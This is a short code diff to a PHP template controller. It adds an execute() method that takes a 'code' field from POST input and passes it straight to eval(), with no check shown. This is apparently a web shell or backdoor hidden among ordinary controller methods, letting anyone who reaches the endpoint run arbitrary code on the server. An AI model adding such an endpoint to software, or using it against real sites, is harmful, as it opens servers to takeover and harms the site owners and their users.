@@ -62,6 +62,16 @@ class template extends controller
 	}
 	
 	/**
+	 * 执行并返回效果ajax
+	 */
+	function execute()
+	{
+		$code = stripslashes(input::getInput("post.code"));
+		print_r($code);
+		exit(eval("?>$code<?php "));
+	}
+	
+	/**
 	 * 删除数据
 	 */
 	function delete()
